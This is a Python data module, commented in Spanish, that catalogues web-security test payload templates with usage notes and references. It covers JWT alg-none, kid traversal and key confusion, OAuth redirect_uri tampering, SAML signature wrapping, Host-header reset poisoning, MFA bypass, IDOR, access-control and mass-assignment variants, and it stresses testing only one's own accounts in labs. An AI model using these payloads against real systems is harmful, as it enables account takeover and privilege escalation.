"""Bancos de variantes para autenticación y autorización.

Cada entrada tiene: nivel, título, lenguaje, bloque de variantes, nota de uso y
fuente técnica. Los marcadores entre llaves son valores del laboratorio o de
cuentas/objetos propios; cada línea es una variante, no una secuencia de ataque.
"""

PS_AUTH = "https://portswigger.net/web-security/authentication"
PS_PASS = "https://portswigger.net/web-security/authentication/password-based"
PS_OTHER = "https://portswigger.net/web-security/authentication/other-mechanisms"
PS_MFA = "https://portswigger.net/web-security/authentication/multi-factor"
PS_JWT = "https://portswigger.net/web-security/jwt"
PS_OAUTH = "https://portswigger.net/web-security/oauth"
PS_ACCESS = "https://portswigger.net/web-security/access-control"
PS_IDOR = "https://portswigger.net/web-security/access-control/idor"
PS_HOST = "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning"
PS_GRAPHQL = "https://portswigger.net/web-security/graphql"
PATT_JWT = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md"
PATT_OAUTH = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md"
PATT_SAML = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md"
PATT_IDOR = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md"
PATT_MASS = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md"
PATT_MFA = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md"
OWASP_BOLA = "https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/"
OWASP_BFLA = "https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/"
OWASP_API3 = "https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/"
OWASP_SAML = "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html"
OWASP_MASS = "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
OWASP_RESET = "https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"
OWASP_SESSION = "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
RFC_JWT = "https://datatracker.ietf.org/doc/html/rfc8725"
RFC_OAUTH = "https://datatracker.ietf.org/doc/html/rfc9700"
RFC_PKCE = "https://datatracker.ietf.org/doc/html/rfc7636"


def B(nivel, titulo, lenguaje, codigo, nota, fuente_url):
    return (nivel, titulo, lenguaje, codigo.strip(), nota, fuente_url)


BANCOS = {
    "autenticacion-rota": [
        B("basicos", "Rutas privadas sin sesión", "text", r"""
GET /api/me
GET /api/account
GET /api/profile
GET /api/orders/{ID_PEDIDO_PROPIO}
GET /api/settings
""", "Repetir sin Cookie ni Authorization y comparar con la respuesta autenticada de una cuenta propia. Un 200 con shell HTML no acredita exposición.", PS_AUTH),
        B("basicos", "Campos de identidad en login", "text", r"""
username={USUARIO_PROPIO}&password={CLAVE_DE_PRUEBA}
email={EMAIL_PROPIO}&password={CLAVE_DE_PRUEBA}
login={USUARIO_PROPIO}&password={CLAVE_DE_PRUEBA}
username={USUARIO_INEXISTENTE_DE_PRUEBA}&password={CLAVE_DE_PRUEBA}
""", "Comparar mensajes, códigos y longitud a baja frecuencia. Usa identidades de prueba; la discrepancia debe ser estable para indicar enumeración.", PS_PASS),
        B("contextos", "Estado incompleto de autenticación", "text", r"""
GET /api/me                     Cookie: session={COOKIE_TRAS_PASSWORD}
GET /api/account/settings       Cookie: session={COOKIE_MFA_PENDIENTE}
GET /api/billing                Cookie: session={COOKIE_MFA_PENDIENTE}
GET /api/me                     Authorization: Bearer {TOKEN_PRE_MFA_PROPIO}
""", "Solo en una cuenta propia con MFA. Compara la misma ruta después del segundo factor; acceso a datos o funciones privadas antes de MFA confirma el fallo.", PS_MFA),
        B("contextos", "Revocación tras eventos de cuenta", "text", r"""
GET /api/me  Cookie: session={COOKIE_ANTES_DE_LOGOUT}
GET /api/me  Cookie: session={COOKIE_ANTES_DE_CAMBIAR_CLAVE}
GET /api/me  Authorization: Bearer {TOKEN_ANTES_DE_LOGOUT}
GET /api/me  Authorization: Bearer {TOKEN_ANTES_DE_RESET}
""", "Guardar solo identificadores de sesión de tu cuenta y descartar luego. Valorar contra la política de revocación anunciada y la expiración real del token.", PS_OTHER),
        B("avanzados", "Autenticación desigual por superficie", "text", r"""
GET /account/profile
GET /api/account/profile
GET /api/v1/account/profile
GET /api/v2/account/profile
GET /graphql?query={viewer{id}}
""", "Cuando la misma función existe en web, API y GraphQL, comparar sin sesión y con sesión propia. No inferir bypass de un endpoint que solo devuelve datos públicos.", PS_ACCESS),
    ],
    "jwt": [
        B("basicos", "Cabeceras alg y firma", "json", r"""
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"HS256","typ":"JWT"}
{"alg":"RS256","typ":"JWT"}
""", "Modificar únicamente tokens propios y reconstruir sus tres segmentos. Las variantes none son válidas solo si el verificador acepta la ausencia de firma; un token rechazado es el resultado esperado.", PS_JWT),
        B("basicos", "Claims de validación", "json", r"""
{"sub":"{USUARIO_PROPIO}","iss":"{EMISOR_ESPERADO}","aud":"{AUDIENCIA_ESPERADA}"}
{"sub":"{USUARIO_PROPIO}","iss":"{EMISOR_INCORRECTO}","aud":"{AUDIENCIA_ESPERADA}"}
{"sub":"{USUARIO_PROPIO}","iss":"{EMISOR_ESPERADO}","aud":"{AUDIENCIA_INCORRECTA}"}
{"sub":"{USUARIO_PROPIO}","exp":{EPOCH_EXPIRADO}}
{"sub":"{USUARIO_PROPIO}","nbf":{EPOCH_FUTURO}}
""", "Estas son plantillas de payload, no JWT completos. Solo tokens firmados con claves de prueba permiten aislar la validación de claims; alterarlos sin firmar demuestra rechazo de firma, no de claims.", RFC_JWT),
        B("contextos", "Selección de clave por kid", "json", r"""
{"alg":"HS256","kid":"{ID_CLAVE_VALIDO}"}
{"alg":"HS256","kid":"{ID_CLAVE_DESCONOCIDO}"}
{"alg":"HS256","kid":"../{RUTA_CLAVE_CONTROLADA}"}
{"alg":"HS256","kid":"{ID_CLAVE_VALIDO}","typ":"JWT"}
""", "Comparar selección de clave en un entorno autorizado. La ruta con ../ solo tiene sentido si kid se usa como ruta de archivo; no asumir que un kid arbitrario permite falsificación.", PS_JWT),
        B("contextos", "Referencias remotas y clave embebida", "json", r"""
{"alg":"RS256","jku":"https://{DOMINIO_CONTROLADO}/jwks.json"}
{"alg":"RS256","jwk":{"kty":"RSA","kid":"{ID_CLAVE_CONTROLADA}","n":"{N_BASE64URL}","e":"AQAB"}}
{"alg":"RS256","x5u":"https://{DOMINIO_CONTROLADO}/cert.pem"}
{"alg":"RS256","kid":"{ID_CLAVE_CONTROLADA}"}
""", "Usar una clave y dominio propios en laboratorio. La aceptación exige que el verificador confíe incorrectamente en jku/jwk/x5u o seleccione la clave equivocada; el callback por sí solo no demuestra aceptación.", PS_JWT),
        B("avanzados", "Confusión de familia algorítmica", "text", r"""
Header esperado: {"alg":"RS256","typ":"JWT"}
Variante A:       {"alg":"HS256","typ":"JWT"}
Variante B:       {"alg":"HS384","typ":"JWT"}
Variante C:       {"alg":"HS512","typ":"JWT"}
Clave HMAC:       {CLAVE_PUBLICA_RSA_DEL_SERVIDOR}
""", "Solo donde la aplicación usa RSA y expone la clave pública. El servidor vulnerable reutiliza indebidamente esa clave como secreto HMAC; requiere generar una firma válida sobre un token propio.", PATT_JWT),
        B("avanzados", "Tipo, emisor y audiencia entre servicios", "json", r"""
{"typ":"JWT","alg":"RS256","kid":"{KID_DEL_EMISOR_A}"}
{"typ":"at+jwt","alg":"RS256","kid":"{KID_DEL_EMISOR_A}"}
{"iss":"{EMISOR_A}","aud":"{API_A}","sub":"{USUARIO_PROPIO}"}
{"iss":"{EMISOR_A}","aud":"{API_B}","sub":"{USUARIO_PROPIO}"}
""", "Solo comparar tokens emitidos legítimamente para servicios diferentes. Aceptar un token válido para otra audiencia o propósito es confusión de contexto, no ruptura criptográfica.", RFC_JWT),
    ],
    "oauth": [
        B("basicos", "Parámetros de autorización", "text", r"""
response_type=code&client_id={CLIENT_ID}&redirect_uri={CALLBACK}&state={STATE_PROPIO}
response_type=code&client_id={CLIENT_ID}&redirect_uri={CALLBACK}
response_type=code&client_id={CLIENT_ID}&redirect_uri={CALLBACK}&state={STATE_SESION_B_PROPIA}
response_type=code&client_id={CLIENT_ID}&redirect_uri={CALLBACK}&state=
""", "Comparar dos sesiones propias y observar si el cliente vincula la respuesta al navegador iniciador. La ausencia de state es relevante cuando el flujo carece de protección equivalente.", PS_OAUTH),
        B("basicos", "Redirect URI de callback", "text", r"""
redirect_uri=https://{CLIENTE}/callback
redirect_uri=https://{CLIENTE}/callback/
redirect_uri=https://{CLIENTE}/callback?next=%2Fperfil
redirect_uri=https://{CLIENTE}/callback/../salida
redirect_uri=https://{SUBDOMINIO_CONTROLADO}/callback
""", "Probar contra el registro real del cliente, una variante por solicitud. Una redirección externa es crítica si lleva un código o token utilizable; registrar el destino final sin compartir códigos.", PATT_OAUTH),
        B("contextos", "PKCE y enlace entre código y desafío", "text", r"""
code_challenge={DESAFIO_S256_PROPIO}&code_challenge_method=S256
code_challenge={DESAFIO_PLAIN_PROPIO}&code_challenge_method=plain
code_challenge={DESAFIO_S256_PROPIO}
code_verifier={VERIFIER_INCORRECTO}
code_verifier={VERIFIER_DE_OTRA_SESION_PROPIA}
""", "Solo en flujos PKCE y con códigos de tus sesiones. El token endpoint debe rechazar verifier incorrecto o de otra sesión; omitir challenge tiene valor si la política exige PKCE.", RFC_PKCE),
        B("contextos", "OIDC y scopes", "text", r"""
scope=openid%20profile
scope=openid%20email
scope=openid%20profile%20email
nonce={NONCE_PROPIO}
nonce={NONCE_DE_OTRA_SESION_PROPIA}
""", "Comparar identidad recibida y vinculación de nonce para dos cuentas propias. Pedir un scope no demuestra autorización; verifica lo concedido y lo consumido por el cliente.", PS_OAUTH),
        B("avanzados", "Emisor y cliente en varios proveedores", "text", r"""
iss={ISSUER_A}  client_id={CLIENT_A}  redirect_uri={CALLBACK_A}
iss={ISSUER_B}  client_id={CLIENT_B}  redirect_uri={CALLBACK_B}
iss={ISSUER_A}  client_id={CLIENT_B}  redirect_uri={CALLBACK_B}
iss={ISSUER_B}  client_id={CLIENT_A}  redirect_uri={CALLBACK_A}
""", "En una integración con dos IdP de prueba, cada respuesta debe vincularse al emisor y cliente que inició la solicitud. La mezcla de valores solo es válida como prueba controlada de mix-up.", RFC_OAUTH),
        B("avanzados", "Código de autorización y token endpoint", "text", r"""
code={CODIGO_PROPIO_A}&redirect_uri={CALLBACK_A}&client_id={CLIENT_A}
code={CODIGO_PROPIO_A}&redirect_uri={CALLBACK_B}&client_id={CLIENT_A}
code={CODIGO_PROPIO_A}&redirect_uri={CALLBACK_A}&client_id={CLIENT_B}
code={CODIGO_PROPIO_YA_CANJEADO}&redirect_uri={CALLBACK_A}&client_id={CLIENT_A}
""", "Un código debe canjearse una vez y permanecer ligado al cliente, redirect URI y PKCE del flujo. Usa códigos efímeros propios; el rechazo consistente es el comportamiento esperado.", RFC_OAUTH),
    ],
    "saml": [
        B("basicos", "Campos de destinatario y audiencia", "xml", r"""
Destination="{ACS_ESPERADO}"
Destination="{ACS_ALTERNO}"
<Audience>{SP_ENTITY_ID_ESPERADO}</Audience>
<Audience>{SP_ENTITY_ID_DISTINTO}</Audience>
SubjectConfirmationData Recipient="{ACS_ESPERADO}"
SubjectConfirmationData Recipient="{ACS_DISTINTO}"
""", "Fragmentos para modificar una respuesta SAML emitida para una cuenta de laboratorio. Sin una firma válida, el rechazo solo prueba integridad; para audiencia/destinatario usa IdP propio.", OWASP_SAML),
        B("basicos", "Vigencia y correlación", "xml", r"""
InResponseTo="{REQUEST_ID_ACTUAL}"
InResponseTo="{REQUEST_ID_ANTERIOR_PROPIO}"
NotBefore="{INSTANTE_FUTURO}"
NotOnOrAfter="{INSTANTE_EXPIRADO}"
<OneTimeUse/>
""", "Usar aserciones y solicitudes propias. La aceptación de una respuesta vencida, futura o no solicitada requiere verificar el contexto del flujo y el reloj del SP.", OWASP_SAML),
        B("contextos", "Nombre de sujeto y atributos de rol", "xml", r"""
<NameID>{USUARIO_A_PROPIO}</NameID>
<NameID>{USUARIO_B_PROPIO}</NameID>
<Attribute Name="email"><AttributeValue>{EMAIL_A_PROPIO}</AttributeValue></Attribute>
<Attribute Name="groups"><AttributeValue>{GRUPO_DE_PRUEBA}</AttributeValue></Attribute>
""", "Cambiar atributos rompe la firma normal; para comprobar mapeos y privilegios emite aserciones válidas desde un IdP de prueba. No concluir bypass por solo editar XML local.", PATT_SAML),
        B("contextos", "RelayState y destino posterior", "text", r"""
RelayState=%2Fperfil
RelayState=%2Fcuenta
RelayState=https%3A%2F%2F{DOMINIO_CONTROLADO}%2Fretorno
RelayState=%2F%2F{DOMINIO_CONTROLADO}%2Fretorno
""", "Prueba una variante por flujo propio. RelayState puede causar redirección, pero no confirma alteración de identidad SAML; verifica si se filtran códigos o información sensible.", OWASP_SAML),
        B("avanzados", "Firma y nodo consumido", "xml", r"""
<Response ID="{ID_RESPUESTA}"><Assertion ID="{ID_FIRMADO}">...</Assertion></Response>
<Response ID="{ID_RESPUESTA}"><Assertion ID="{ID_NO_FIRMADO}">...</Assertion><Assertion ID="{ID_FIRMADO}">...</Assertion></Response>
<Response ID="{ID_RESPUESTA}"><Assertion ID="{ID_FIRMADO}">...</Assertion><Assertion ID="{ID_NO_FIRMADO}">...</Assertion></Response>
<Reference URI="#{ID_FIRMADO}"/>
""", "Esquema para laboratorio de XML Signature Wrapping; los puntos suspensivos representan una aserción SAML válida de prueba, no un payload funcional. La evidencia exige que el SP use la aserción distinta de la firmada.", OWASP_SAML),
    ],
    "fijacion-sesion": [
        B("basicos", "Identificador antes y después de login", "text", r"""
Cookie: session={ID_ANONIMO_PROPIO}
Cookie: session={ID_TRAS_LOGIN_PROPIO}
Cookie: JSESSIONID={ID_ANONIMO_PROPIO}
Cookie: JSESSIONID={ID_TRAS_LOGIN_PROPIO}
""", "Capturar los IDs de la misma cuenta de laboratorio antes y después de autenticarse. La igualdad estable sugiere falta de rotación, pero se requiere demostrar que el valor podía fijarse.", OWASP_SESSION),
        B("basicos", "Vías de transporte de sesión", "text", r"""
Cookie: session={ID_DE_PRUEBA}
GET /cuenta?sessionid={ID_DE_PRUEBA}
GET /cuenta;jsessionid={ID_DE_PRUEBA}
POST /login  sessionid={ID_DE_PRUEBA}
""", "Solo probar vías que la aplicación realmente acepta. Una cadena ignorada en URL o cuerpo no constituye fijación.", OWASP_SESSION),
        B("contextos", "Transiciones que deben rotar sesión", "text", r"""
anonimo -> login -> /api/me
password -> MFA -> /api/me
usuario -> administrador -> /api/me
reset de clave -> nuevo login -> /api/me
""", "Registrar el identificador propio en cada transición. La rotación se evalúa donde aumenta el nivel de autenticación o privilegio, con cookies y tokens por separado.", OWASP_SESSION),
        B("contextos", "Alcance de cookie", "text", r"""
Set-Cookie: session={ID}; Path=/; Secure; HttpOnly
Set-Cookie: session={ID}; Domain={DOMINIO_PADRE}; Path=/
Set-Cookie: session={ID}; Domain={SUBDOMINIO}; Path=/
Set-Cookie: session={ID}; SameSite=Lax
""", "Inspeccionar atributos emitidos; no todos son payloads para enviar. El riesgo de fijación por subdominio requiere control legítimo de ese subdominio y aceptación de la cookie por el servidor.", OWASP_SESSION),
        B("avanzados", "Sesión de dos navegadores propios", "text", r"""
Navegador A: cookie={ID_PRE_LOGIN_A} -> iniciar sesión A
Navegador B: cookie={ID_PRE_LOGIN_A} -> abrir /api/me
Navegador A: cookie={ID_POST_LOGIN_A} -> abrir /api/me
Navegador B: cookie={ID_POST_LOGIN_A} -> abrir /api/me
""", "Ejecutar solo entre navegadores controlados y limpiar sesiones después. La prueba fuerte demuestra que un ID conocido antes del login queda autenticado y reutilizable.", OWASP_SESSION),
    ],
    "reset-password-poisoning": [
        B("basicos", "Cabeceras de origen una por solicitud", "text", r"""
Host: {DOMINIO_LEGITIMO}
Host: {DOMINIO_CONTROLADO}
X-Forwarded-Host: {DOMINIO_CONTROLADO}
X-Original-Host: {DOMINIO_CONTROLADO}
X-Host: {DOMINIO_CONTROLADO}
""", "Solicitar reset solo para un correo propio y cambiar una cabecera por intento. Verificar el enlace recibido en ese buzón: la reflexión en HTML no prueba poisoning.", PS_HOST),
        B("basicos", "Variantes de host y puerto", "text", r"""
Host: {DOMINIO_LEGITIMO}:443
Host: {DOMINIO_LEGITIMO}:{PUERTO_DE_PRUEBA}
Host: {DOMINIO_CONTROLADO}:443
Forwarded: host={DOMINIO_CONTROLADO};proto=https
X-Forwarded-Proto: https
""", "Solo tiene sentido si proxy y aplicación reconstruyen URL absolutas desde estas cabeceras. Verificar que el enlace de reset use el host alterado; no abrirlo en sistemas ajenos.", PS_HOST),
        B("contextos", "Construcción de enlace en rutas de recuperación", "text", r"""
POST /forgot-password
POST /api/auth/forgot-password
POST /api/v1/password/reset
POST /account/recovery/start
POST /users/{USUARIO_PROPIO}/reset
""", "Identificar el endpoint real desde el flujo de una cuenta propia. Cada ruta es candidata a adaptar, no un listado para enviar masivamente.", OWASP_RESET),
        B("contextos", "Origen absoluto y cabecera duplicada", "http", r"""
POST https://{DOMINIO_LEGITIMO}/forgot-password HTTP/1.1
Host: {DOMINIO_LEGITIMO}

POST /forgot-password HTTP/1.1
Host: {DOMINIO_LEGITIMO}
Host: {DOMINIO_CONTROLADO}
""", "Plantillas alternativas para un proxy autorizado. Las cabeceras Host duplicadas son ambiguas; probar individualmente y detenerse si hay efectos sobre usuarios ajenos.", PS_HOST),
        B("avanzados", "Token en URL de correo y destino", "text", r"""
https://{DOMINIO_LEGITIMO}/reset?token={TOKEN_PROPIO}
https://{DOMINIO_CONTROLADO}/reset?token={TOKEN_PROPIO}
https://{DOMINIO_LEGITIMO}/reset/{TOKEN_PROPIO}
https://{DOMINIO_CONTROLADO}/reset/{TOKEN_PROPIO}
""", "Comparar únicamente correos generados para tu cuenta. El impacto requiere que un token real sea enviado al dominio controlado y sea canjeable; no registrar el token sin redacción.", PS_HOST),
    ],
    "mfa-bypass": [
        B("basicos", "Rutas privadas con MFA pendiente", "text", r"""
GET /api/me
GET /api/account/settings
GET /api/profile
GET /api/security/factors
GET /api/orders/{ID_PROPIO}
""", "Usar la cookie propia tras validar contraseña y antes del segundo factor. Comparar con cookie anónima y sesión plenamente autenticada.", PS_MFA),
        B("basicos", "Campos y formatos del código OTP", "text", r"""
otp={OTP_PROPIO_CORRECTO}
otp={OTP_PROPIO_ANTERIOR}
code={OTP_PROPIO_CORRECTO}
verificationCode={OTP_PROPIO_CORRECTO}
totp={OTP_PROPIO_CORRECTO}
""", "Identificar el campo real antes de variar. Un código incorrecto rechazado no demuestra nada; comprobar expiración, uso único y vinculación a la sesión propia sin fuerza bruta.", PS_MFA),
        B("contextos", "Recuperación y dispositivo recordado", "text", r"""
POST /mfa/verify  code={CODIGO_RECUPERACION_PROPIO}
POST /mfa/verify  code={CODIGO_RECUPERACION_YA_USADO}
GET /account      Cookie: trusted_device={COOKIE_PROPIA}
GET /account      Cookie: trusted_device={COOKIE_DE_OTRA_SESION_PROPIA}
""", "Usar códigos de recuperación propios. Un código consumido debe rechazarse; la cookie de dispositivo debe vincularse a cuenta, navegador y política de caducidad.", PATT_MFA),
        B("contextos", "Gestión de factores", "text", r"""
GET /api/mfa/factors
POST /api/mfa/enroll
POST /api/mfa/disable
POST /api/mfa/recovery-codes
POST /api/account/change-email
""", "Adaptar solo rutas existentes y probar cambios reversibles en una cuenta propia. Una operación sensible debe exigir el nivel de autenticación indicado por el producto.", PS_MFA),
        B("avanzados", "Cambio de flujo y estado intermedio", "text", r"""
POST /login -> session={PRE_MFA_A} -> GET /api/me
POST /login -> session={PRE_MFA_A} -> GET /api/security/factors
POST /mfa/verify -> session={POST_MFA_A} -> GET /api/me
POST /mfa/verify -> session={POST_MFA_A} -> GET /api/security/factors
""", "Comparar el mismo recurso a ambos lados de la transición. Solo hay bypass si una cookie de pre-MFA permite una función que exige MFA.", PS_MFA),
        B("avanzados", "Vinculación de desafío OTP", "text", r"""
challenge_id={DESAFIO_A}&code={CODIGO_A}
challenge_id={DESAFIO_A}&code={CODIGO_B}
challenge_id={DESAFIO_B}&code={CODIGO_A}
challenge_id={DESAFIO_A}&code={CODIGO_A_YA_USADO}
""", "Dos desafíos y factores de prueba bajo tu control. La aceptación cruzada puede indicar ausencia de vinculación; nunca usar códigos de terceros.", PATT_MFA),
    ],
    "idor": [
        B("basicos", "ID en ruta y consulta", "text", r"""
GET /api/users/{ID_A}
GET /api/users/{ID_B}
GET /api/orders/{PEDIDO_A}
GET /api/orders/{PEDIDO_B}
GET /api/documents?id={DOCUMENTO_A}
GET /api/documents?id={DOCUMENTO_B}
""", "A y B son dos cuentas u objetos propios. Comparar respuesta, propietario y autorización; diferencias de estado de negocio no bastan.", PS_IDOR),
        B("basicos", "Nombres frecuentes de parámetro", "text", r"""
user_id={ID_B}
accountId={ID_B}
owner={ID_B}
document_id={DOCUMENTO_B}
orderId={PEDIDO_B}
tenant_id={TENANT_B}
""", "Tras identificar un parámetro real, sustituir solo su valor por el de un objeto B propio. Un nombre agregado e ignorado no demuestra autorización rota.", PATT_IDOR),
        B("contextos", "IDs en cuerpo y anidación", "json", r"""
{"userId":"{ID_B}"}
{"ownerId":"{ID_B}","documentId":"{DOCUMENTO_A}"}
{"account":{"id":"{ID_B}"}}
{"items":[{"id":"{ITEM_A}"},{"id":"{ITEM_B}"}]}
""", "Plantillas alternativas: enviar una por solicitud a operaciones existentes. Para lecturas y escrituras, corroborar propiedad del objeto y efecto con las dos cuentas propias.", OWASP_BOLA),
        B("contextos", "Identificadores opacos y codificados", "text", r"""
/api/users/{UUID_A}
/api/users/{UUID_B}
/api/users/{BASE64_DE_ID_A}
/api/users/{BASE64_DE_ID_B}
/api/users/{SLUG_A}
/api/users/{SLUG_B}
""", "Obtener ambos identificadores desde tus cuentas. Que sean UUID o Base64 no sustituye autorización por objeto; evita enumerar IDs ajenos.", PATT_IDOR),
        B("contextos", "Funciones laterales del mismo objeto", "text", r"""
GET /api/documents/{DOCUMENTO_B}
GET /api/documents/{DOCUMENTO_B}/download
GET /api/documents/{DOCUMENTO_B}/preview
GET /api/documents/{DOCUMENTO_B}/history
GET /api/documents/{DOCUMENTO_B}/metadata
""", "Aplicar a un objeto B propio si el producto ofrece estas funciones. La política debe ser consistente en descarga, vista previa, historial y metadatos.", PS_IDOR),
        B("avanzados", "GraphQL y lote de objetos", "graphql", r"""
query { node(id:"{GID_A}") { id } }
query { node(id:"{GID_B}") { id } }
query { a:node(id:"{GID_A}") { id } b:node(id:"{GID_B}") { id } }
query { documents(ids:["{DOCUMENTO_A}","{DOCUMENTO_B}"]) { id ownerId } }
""", "Adaptar al esquema real y usar GID/IDs obtenidos legítimamente. Confirmar si el nodo B devuelve datos privados de B bajo sesión A.", PS_GRAPHQL),
        B("avanzados", "Duplicación de parámetro y formatos", "text", r"""
GET /api/documents?id={DOCUMENTO_A}&id={DOCUMENTO_B}
GET /api/documents?id={DOCUMENTO_B}&id={DOCUMENTO_A}
POST /api/documents/read  {"id":"{DOCUMENTO_B}"}
POST /api/documents/read  id={DOCUMENTO_B}
""", "Probar una variante por solicitud, solo si el endpoint admite esos formatos. La discrepancia entre capa de autorización y capa de datos debe demostrarse con objeto B propio.", PATT_IDOR),
    ],
    "control-acceso": [
        B("basicos", "Funciones administrativas", "text", r"""
GET /admin
GET /admin/users
GET /api/admin/users
GET /api/v1/admin/users
GET /api/settings/roles
""", "Candidatos para adaptar al producto. Comparar anónimo, usuario de prueba y administrador propio; un 200 con página de login no es acceso.", PS_ACCESS),
        B("basicos", "Método sobre la misma ruta", "text", r"""
GET /api/users/{ID_PROPIO}
POST /api/users/{ID_PROPIO}
PATCH /api/users/{ID_PROPIO}
PUT /api/users/{ID_PROPIO}
HEAD /api/users/{ID_PROPIO}
""", "Usar únicamente recursos propios y operaciones reversibles. La matriz busca autorización por método; una respuesta 405 o rechazo de validación es distinta de bypass.", PS_ACCESS),
        B("contextos", "Rol y ámbito declarados por cliente", "text", r"""
Cookie: role=user
Cookie: role=admin
X-Role: admin
X-User-Id: {ID_A}
X-Tenant-Id: {TENANT_B_PROPIO}
""", "Solo variar campos que el cliente envía realmente. Si el servidor ignora estos valores, no hay fallo; comprobar efectos bajo una cuenta de bajo privilegio.", OWASP_BFLA),
        B("contextos", "Cabeceras de reescritura de ruta", "http", r"""
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
""", "Son dos solicitudes alternativas. Válidas cuando un proxy y un backend interpretan rutas distintas; corroborar que la acción final realmente alcanza /admin.", PS_ACCESS),
        B("contextos", "Normalización y versiones de ruta", "text", r"""
/admin
/admin/
/ADMIN
/admin/.
/api/v1/admin
/api/v2/admin
""", "Comparar controles en rutas que efectivamente apuntan a la misma función. El resultado depende del enrutador y del proxy; no atribuir bypass a una página distinta.", PS_ACCESS),
        B("avanzados", "Roles y objeto en una mutación", "json", r"""
{"userId":"{ID_A}","role":"viewer"}
{"userId":"{ID_A}","role":"editor"}
{"userId":"{ID_A}","role":"admin"}
{"userId":"{ID_B}","role":"viewer"}
""", "Enviar solo contra un entorno de prueba donde el cambio es reversible. La verificación debe cubrir tanto permiso de función como permiso sobre el usuario objetivo.", OWASP_BFLA),
        B("avanzados", "GraphQL y API alternativa", "graphql", r"""
query { viewer { id role } }
query { users { id role } }
mutation { updateRole(userId:"{ID_A}", role:"viewer") { id } }
mutation { updateRole(userId:"{ID_A}", role:"admin") { id } }
""", "Adaptar al esquema publicado o descubierto legítimamente; enviar mutaciones solo en cuentas propias. Verificar control de autorización del resolver, no solo visibilidad del campo.", PS_GRAPHQL),
    ],
    "mass-assignment": [
        B("basicos", "Propiedades sensibles en perfil", "json", r"""
{"displayName":"Prueba","isAdmin":true}
{"displayName":"Prueba","role":"admin"}
{"displayName":"Prueba","verified":true}
{"displayName":"Prueba","accountStatus":"active"}
""", "Solicitudes alternativas sobre un perfil propio. La aceptación JSON o eco de respuesta no prueba efecto: releer el estado y verificar un cambio de privilegio real.", OWASP_MASS),
        B("basicos", "IDs y propiedad asignable", "json", r"""
{"displayName":"Prueba","ownerId":"{ID_A}"}
{"displayName":"Prueba","ownerId":"{ID_B}"}
{"displayName":"Prueba","userId":"{ID_B}"}
{"displayName":"Prueba","tenantId":"{TENANT_B_PROPIO}"}
""", "Usar A y B propios para probar creación o edición. Se requiere que el backend persista el propietario no autorizado; un campo ignorado no es hallazgo.", OWASP_API3),
        B("contextos", "Campos anidados y notación de formulario", "text", r"""
profile[role]=admin
user[isAdmin]=true
account[plan]=premium
permissions[0]=admin
role=admin
""", "Una variante por solicitud y solo si el parser admite form encoding o estructuras anidadas. Comparar persistencia y permisos posteriores.", PATT_MASS),
        B("contextos", "Superficies de creación y edición", "text", r"""
POST /api/register
POST /api/users
PATCH /api/me
PUT /api/users/{ID_A}
POST /graphql
""", "Identificar la ruta real y añadir un campo por vez a un objeto propio. El mismo modelo puede exponer reglas de binding distintas entre registro, perfil y API.", OWASP_MASS),
        B("avanzados", "JSON Patch y campo de sistema", "json", r"""
[{"op":"add","path":"/role","value":"admin"}]
[{"op":"replace","path":"/isAdmin","value":true}]
[{"op":"add","path":"/permissions/-","value":"admin"}]
[{"op":"replace","path":"/ownerId","value":"{ID_B}"}]
""", "Solo para endpoints que aceptan RFC 6902. Son documentos alternativos; modificar privilegios únicamente en un entorno de prueba reversible y comprobar autorización final.", OWASP_MASS),
        B("avanzados", "Mutaciones GraphQL con input excesivo", "graphql", r"""
mutation { updateProfile(input:{displayName:"Prueba"}) { id } }
mutation { updateProfile(input:{displayName:"Prueba",role:"admin"}) { id } }
mutation { createUser(input:{email:"{EMAIL_PROPIO}",isAdmin:true}) { id } }
mutation { updateUser(input:{id:"{ID_A}",tenantId:"{TENANT_B_PROPIO}"}) { id } }
""", "Solo enviar campos que el esquema acepte y cuentas propias. El hallazgo exige que un campo reservado se persista y produzca efecto, no solo que aparezca en introspección.", PS_GRAPHQL),
    ],
}
